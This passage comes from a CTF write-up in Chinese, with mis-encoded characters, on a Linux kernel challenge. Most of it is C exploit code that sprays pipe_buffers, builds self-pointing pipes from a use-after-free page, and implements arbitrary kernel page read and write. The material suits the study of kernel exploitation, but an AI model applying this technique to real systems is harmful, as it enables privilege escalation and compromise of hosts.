&quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>               snd_vicitm_pid, snd_orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(snd_vicitm_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write2.png" class title="write2"></li></ul><p>è¿›å…¥çœ¼èŠ±ç¼­ä¹±çš„é˜¶æ®µ(Ë‰â–½Ë‰ï¼›)â€¦ï¼Œbuilding_self_writing_pipe</p><ul><li><p>æˆ‘ä»¬è¦å†æ¬¡å°†uafçš„pageåˆ†é…ä¸ºpipe_bufferï¼Œè¿™æ¬¡é€‰æ‹©slab-192ï¼Œé€»è¾‘ä¸ä¸Šæ¬¡ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬è¦æ”¹å†™ç¬¬äºŒä¸ªslab-192çš„pipe_bufferï¼ˆä¹‹å‰å·²å†™å…¥40 + 2 * 4å­—èŠ‚ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <br><span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ›´æ”¹ç¬¬äºŒä¸ªslab-192çš„pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.page = info_pipe_buf.page;<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.ops = info_pipe_buf.ops;<br>evil_pipe_buf.flags = info_pipe_buf.flags;<br>evil_pipe_buf.private = info_pipe_buf.private;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point.png" class title="slf-point"></li><li><p>æ£€æŸ¥åŠ«æŒæ˜¯å¦æˆåŠŸï¼ˆæ ¹æ®pipe_buffer-&gt;pageï¼‰ï¼Œç¡®å®šç¬¬ä¸€ä¸ªself-pointing pipe_bufferåºå·self_2nd_pipe_pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_2nd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                self_2nd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_2nd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è·å¾—ç¬¬äºŒä¸ªself-pointing pipe_bufferï¼Œç¡®å®šåºå·self_3rd_pipe_pidï¼Œè¿™æ—¶æ›´æ”¹çš„æ˜¯ç¬¬ä¸‰ä¸ªslab-192çš„pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_3rd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_3rd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point1.png" class title="slf-point1"></li><li><p>è·å¾—ç¬¬ä¸‰ä¸ªself-pointing pipe_bufferï¼Œç¡®å®šåºå·self_4th_pipe_pidï¼Œè¿™æ—¶æ›´æ”¹çš„æ˜¯ç¬¬å››ä¸ªslab-192çš„pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_4th_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point2.png" class title="slf-point2"></li><li><p>ä»¥ä¸Šè¿‡ç¨‹<strong>å¤§éƒ¨åˆ†pipe</strong>éœ€è¦è¯»å–2æ¬¡<strong>8å­—èŠ‚å­—ç¬¦ä¸²+4å­—èŠ‚åºå·</strong>ï¼Œä¸‰æ¬¡<strong>8å­—èŠ‚æŒ‡é’ˆ</strong>ï¼Œæ‰€ä»¥æœ€å¼€å§‹éœ€è¦è¿™ä¹ˆwriteğŸ‘‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure></li></ul><p><em><strong>psï¼šå› ä¸ºå¼€å¯äº†Random freelistï¼Œæ‰€ä»¥è·å–çš„self-pointing pipe_bufferçš„åºå·å¯èƒ½ä¸æ˜¯è¿ç»­çš„</strong></em></p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/random.png" class title="random"><h2 id="ä»»æ„è¯»å†™"><a href="#ä»»æ„è¯»å†™" class="headerlink" title="ä»»æ„è¯»å†™"></a>ä»»æ„è¯»å†™</h2><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸‰ä¸ªself-pointing pipe_buffer</p><ul><li>ç¬¬ä¸€ä¸ªç®¡é“ç”¨ä»¥è¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹å…¶ page æŒ‡é’ˆå®Œæˆ</li><li>ç¬¬äºŒä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œä½¿å…¶å†™å…¥çš„èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸€ä¸ªä¸ç¬¬äºŒä¸ªç®¡é“ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªç®¡é“çš„ pipe æŒ‡é’ˆæŒ‡å‘æŒ‡å®šä½ç½®ï¼Œç¬¬äºŒä¸ªç®¡é“çš„å†™å…¥èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“</li></ul><p>ç»§ç»­exp</p><ul><li><p>å…ˆè°ƒç”¨setup_evil_pipeè¿›è¡Œä¸€äº›åˆå§‹åŒ–</p><ul><li><p>å…ˆè¿›è¡Œä¸€äº›è¦†ç›–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure></li><li><p>ç¬¬ä¸€ä¸ªç®¡é“ç”¨äºè¿›è¡Œä»»æ„è¯»å†™ï¼Œå…ˆå°†readåˆå§‹åŒ–ä¸ºé¡µå¼€å§‹ï¼Œwriteåˆå§‹åŒ–ä¸ºé¡µå°¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe2.png" class title="pipe2"></li><li><p>ç¬¬äºŒä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œæ‰€ä»¥åˆ©ç”¨ç¬¬ä¸‰ä¸ªç®¡é“ä¿®æ”¹ç¬¬äºŒä¸ªç®¡é“ï¼Œreadï¼Œwriteéƒ½æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“ï¼ˆåˆå§‹åŒ–æ—¶ç¬¬ä¸‰ä¸ªç®¡é“çš„readæŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“ï¼ŒwriteæŒ‡å‘ç¬¬äºŒä¸ªç®¡é“ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe3.png" class title="pipe3"></li><li><p>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸€ç¬¬äºŒä¸ªç®¡é“ï¼Œæ‰€ä»¥writeï¼Œreadéƒ½æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“ï¼ˆåœ¨æ¯æ¬¡ä»»æ„è¯»å†™æ—¶åˆå§‹åŒ–ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_4th_buf.len = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>åˆå§‹åŒ–å®Œæ¯•å°±å¯ä»¥ä»»æ„è¯»å†™äº†ï¼Œå…ˆæ˜¯è¯»arbitrary_read_by_pipe</p><ul><li><p>ä¹¦æ¥ä¸Šå›ï¼Œæ¯æ¬¡ä»»æ„è¯»å†™çš„æ—¶å€™è¦ä½¿ç”¨pipe2åˆå§‹åŒ–pipe3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read11.png" class title="read11"></li><li><p>ä½¿ç”¨pipe3ä¿®æ”¹pipe1ï¼ŒæŒ‡å‘è¦è¯»å†™çš„é¡µå¹¶åˆå§‹åŒ–readæŒ‡å‘é¡µå¼€å§‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* page to read */</span><br>evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>evil_2nd_buf.page = page_to_read;<br>    <br><span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read22.png" class title="read22"><p>æ¥ä¸‹æ¥çš„writeæ˜¯ä¸ºäº†è·³è¿‡pipe1ï¼Œå‡†å¤‡ä¿®æ”¹pipe2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>      temp_zero_buf, <br>      TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read33.png" class title="read33"></li><li><p>æœ€å¼€å§‹pipe2ç”¨äºåˆå§‹åŒ–pipe3äº†ï¼Œè¿™é‡Œä½¿ç”¨pipe3æŠŠpipe2å†æ”¹å›å»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read44.png" class title="read44"></li><li><p>æœ€ç»ˆç›®çš„â€”â€”æŠŠæ•°æ®è¯»å‡ºæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read out data */</span><br>read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read55.png" class title="read55"></li></ul></li><li><p>ä»»æ„å†™arbitrary_write_by_pipeå’Œä»»æ„è¯»æ€è·¯ä¸€è‡´ï¼ˆé™¤äº†pipe1çš„writeçš„æŒ‡å‘ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="ä»»æ„è¯»å†™è®¾è®¡æ€è·¯"><a href="#ä»»æ„è¯»å†™è®¾è®¡æ€è·¯" class="headerlink" title="ä»»æ„è¯»å†™è®¾è®¡æ€è·¯"></a>ä»»æ„è¯»å†™è®¾è®¡æ€è·¯</h3><p>åˆ°åˆ©ç”¨uafæ³„éœ²pageè¿™ä¸€æ­¥éƒ½æ˜¯æƒ¯å¸¸æ“ä½œ</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class title="uaf"><ul><li><p>self-pointingï¼šè¦è¾¾æˆä»»æ„é¡µè¯»å†™é¦–å…ˆæˆ‘ä»¬è¦èƒ½å¤Ÿæ›´æ”¹pageæŒ‡é’ˆï¼Œè¦æ›´æ”¹pageæŒ‡é’ˆå°±è¦çŸ¥é“pipe_bufferåœ°å€å†è®©pageæŒ‡å‘pipe_bufferâ€¦â€¦å¬èµ·æ¥å¾ˆåƒæ­»å¾ªç¯(Ë‰â–½Ë‰ï¼›)â€¦</p><p>ä½†ç”±äºæˆ‘ä»¬å·²ç»æ³„éœ²äº†ä¸€ä¸ªpageåœ°å€ï¼Œæ‰€ä»¥è®©è¿™ä¸ªpageä¸Šçš„pipe_buffer-&gt;pageæŒ‡å‘è‡ªå·±å°±èƒ½è§£å†³ä»¥ä¸Šé—®é¢˜</p></li><li><p>ä¸‰ä¸ªpipeçš„æ›´æ”¹ç±»ä¼¼äºä¸€ä¸ªè¿™æ ·çš„å¾ªç¯</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E5%BE%AA%E7%8E%AF.png" class 